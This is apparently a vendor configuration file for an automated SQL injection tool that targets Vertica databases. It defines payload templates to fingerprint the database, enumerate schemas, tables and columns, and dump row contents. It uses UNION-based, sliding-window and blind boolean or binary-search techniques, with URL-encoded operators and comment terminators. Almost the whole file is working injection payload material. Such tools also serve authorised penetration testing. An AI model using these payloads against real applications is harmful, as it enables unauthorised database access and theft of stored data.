vendor: Vertica

resource:
 info: |
  select
      '${enclose_value_sql}'
      || version()
      || '${enclose_value_sql}'
      || current_database()
      || '${enclose_value_sql}'
      || user
      || '${trail_sql}'

 schema:
  database: |
   select
       rr
       ||'${trail_sql}'
       r
   from (
       select distinct
           '${enclose_value_sql}'
           || schema_name
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           rr
       from v_catalog.all_tables
       order by rr
       ${limit}
   )x

  table: |
   select
       rr
       ||'${trail_sql}'
       r
   from (
       select distinct
           '${enclose_value_sql}'
           || table_name
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           rr
       from v_catalog.all_tables
       where schema_name = '${database}'
       order by rr
       ${limit}
   )x

  column: |
   select
       rr
       ||'${trail_sql}'
       r
   from (
       select distinct
           '${enclose_value_sql}'
           || column_name
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           rr
       from v_catalog.odbc_columns
       where odbc_columns.schema_name = '${database}'
       and odbc_columns.table_name = '${table}'
       order by rr
       ${limit}
   )x

  row:
   query: |
    select
        rr
        ||'${trail_sql}'
        r
    from (
        select distinct
            '${enclose_value_sql}'
            || (${fields})
            || '${separator_qte_sql}'
            || '0'
            || '${enclose_value_sql}'
            rr
        from ${database}.${table}
        order by rr
        ${limit}
    )x
   fields:
    field: |
     trim(
         coalesce(
             cast(${field.value} as varchar),
             ''
         )
     )
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       /**
        * If reach end of string (${lead}i) then NULLIF nullifies the result
        */
       '${lead}'
       || nullif(
           substr(
               (${injection}),
               ${window.char},
               65536
           ),
           '${trail_sql}'
       )
  limit: limit 1 offset ${limit.value}
  failsafe: cast((1337${indice}7330%2b1) as varchar)
  calibrator: repeat('${calibrator_sql}', 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - vertica
   orderByErrorMessage:
    # Collision with postgres
    - (?!.*Vertica)ORDER BY position 1337 is not in select list
   vendorSpecific: "'a' = case when ${test} then 'a' else URI_PERCENT_ENCODE('') end"

 union:
  indices: union select ${indices}
  capacity: (select '${lead}' || ${indice} || ${calibrator})
  orderBy: order by 1337

 binary:
  test:
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != ascii(substr(
        (${injection}),
        ${window.char},
        1
    )) 
    %26${bit}
   bin: |
    substr(
        (${injection}),
        ${window.char},
        1
    )
    %3E%3Dchr(${mid.int})
   truthyBin:
    - chr(97)%3E%3Dchr(97)
    - chr(97)%3E%3Dchr(65)
    - chr(97)%3E%3Dchr(48)
    - chr(98)%3E%3Dchr(97)
    - chr(98)%3E%3Dchr(66)
    - chr(49)%3E%3Dchr(48)
   falsyBin:
    - chr(97)%3E%3Dchr(98)
    - chr(65)%3E%3Dchr(97)
    - chr(66)%3E%3Dchr(98)
    - chr(66)%3E%3Dchr(97)
    - chr(48)%3E%3Dchr(65)
    - chr(48)%3E%3Dchr(49)
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}